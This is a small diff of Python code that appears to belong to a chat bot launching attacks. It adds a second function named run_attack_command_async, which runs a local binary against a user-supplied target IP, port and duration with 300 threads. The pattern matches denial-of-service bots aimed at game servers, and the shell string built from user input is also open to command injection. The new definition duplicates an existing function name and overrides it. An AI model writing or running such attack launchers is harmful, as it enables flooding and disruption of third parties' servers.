@@ -86,7 +86,10 @@ async def start_asyncio_loop():
 async def run_attack_command_async(target_ip, target_port, duration):
     process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 300")
     await process.communicate()
-    
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    process = await asyncio.create_subprocess_shell(f"./sex {target_ip} {target_port} {duration} 300")
+    await process.communicate()
 
 def is_user_admin(user_id, chat_id):
     try:
